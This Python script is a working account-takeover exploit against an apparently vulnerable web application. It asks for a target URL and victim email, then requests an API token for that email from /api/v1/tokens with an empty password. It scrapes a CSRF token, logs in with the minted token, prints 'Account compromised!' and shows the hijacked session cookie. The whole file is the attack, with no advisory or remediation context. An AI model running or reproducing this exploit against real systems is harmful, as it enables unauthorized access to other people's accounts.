import requests
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import re

init(autoreset=True)

def print_success(message):
    print(f"{Fore.GREEN}[+] {Fore.WHITE}{message}")

def print_error(message):
    print(f"{Fore.RED}[-] {Fore.WHITE}{message}")

def print_info(message):
    print(f"{Fore.BLUE}[*] {Fore.WHITE}{message}")

def print_warning(message):
    print(f"{Fore.YELLOW}[!] {Fore.WHITE}{message}")

def print_query(message):
    print(f"{Fore.MAGENTA}[?] {Fore.WHITE}{message}", end=" ")

def send_request(target_url, email):
    url = f"{target_url}/api/v1/tokens"
    headers = {'Content-Type': 'application/json'}
    payload = {
        "name": "",
        "ttl": "0",
        "password": "",
        "email": email
    }

    try:
        # Send POST request
        response = requests.post(url, json=payload, headers=headers)

        # Check if the request was successful
        if response.status_code == 200:
            print_success(f"API Token generated successfully.")
            data = response.json()

            # Extract and print response data
            print_info(f"Response Status: {response.status_code} OK")
            print_info(f"Token ID: {data['id']}")
            print_info(f"Created At: {data['created_at']}")
            print_info(f"Last Accessed At: {data['last_accessed_at']}")
            print_info(f"IP Address: {data['ip_address']}")
            print_info(f"Organization ID: {data['org_id']}")
            print_info(f"Organization Name: {data['org_name']}")
            print_info(f"User ID: {data['user_id']}")
            print_info(f"Name: {data['name']}")
            print_info(f"TTL: {data['ttl']}")
            print_success(f"API Token: {data['token']}")

        else:
            print_error("Error: Unsuccessful request!")
            print_error(f"Status Code: {response.status_code}")
            print_error(f"Response: {response.text}")

        return data['token']
    
    except Exception as e:
        print_error(f"Error: {str(e)}")

def get_csrf_token_and_cookie(target_url):
    session = requests.Session()  # Use a session to persist cookies

    try:
        # Send GET request to the root of the target URL to get the csrf token and session cookie
        response = session.get(target_url)
        
        if response.status_code == 200:
            # Extract CSRF token from embedded JavaScript using regex
            match = re.search(r'const CSRF_TOKEN="([^"]+)"', response.text)
            if match:
                csrf_token = match.group(1)
                # Extract the session cookie from the cookies set by the response
                temporary_cookie = session.cookies.get('session.id')
                
                # print_info(f"CSRF Token: {csrf_token}")
                # print_info(f"Temporary Cookie: {temporary_cookie}")
                
                # Return the CSRF token and session cookie
                return csrf_token, temporary_cookie
            else:
                print_error("Error: CSRF token not found in the response.")
                return None, None
        else:
            print_error(f"Error: Unable to get the page. Status code: {response.status_code}")
            return None, None

    except Exception as e:
        print_error(f"Error: {str(e)}")
        return None, None

def login_to_account(target_url, email, token):
    print_info(f"Fetching CSRF token and temporary session cookie...")
    csrf_token, temporary_cookie = get_csrf_token_and_cookie(target_url)
    
    print_info(f"Attempting login with token...")
    login_url = f"{target_url}/login"
    headers = {
        'Content-Type': 'application/json',
        'csrf-token': csrf_token,
        'Cookie': f"session.id={temporary_cookie}"
    }
    payload = {
        "username": "",
        "email": email,
        "token": token
    }

    try:
        response = requests.post(login_url, json=payload, headers=headers, allow_redirects=False)

        if response.status_code == 200:
            print_success("Login successful. Account compromised!")

            # Extract the new session ID from the Set-Cookie header
            set_cookie_header = response.headers.get("Set-Cookie")
            if set_cookie_header:
                new_session_id = set_cookie_header.split("session.id=")[-1].split(";")[0]
                print_success(f"Session Cookie: session.id={new_session_id}")
                return new_session_id
            else:
                print_warning("No session ID found in response.")
                return None

        else:
            print_error(f"Login failed! Status Code: {response.status_code}")
            print_error(f"Response: {response.text}")
            return None

    except Exception as e:
        print_error(f"Error during login: {str(e)}")
        return None

def main():
    # Prompt user for the IP address and email address
    print_query("Enter the target URL (e.g., http://example.com):")
    target_url = input()
    
    print_query("Enter the target email address:")
    email = input()

    # Send request to create arbitrary API token in specified account
    token = send_request(target_url, email)

    # Ask if the user wants to proceed to login
    user_input = input(print_query("Do you want to proceed to login with the created token? (y/n, default is y): ") or "y").lower()

    if user_input == 'y' or user_input == '':
        login_to_account(target_url, email, token)
    elif user_input == 'n':
        print_warning("Exiting...")

if __name__ == "__main__":
    main()
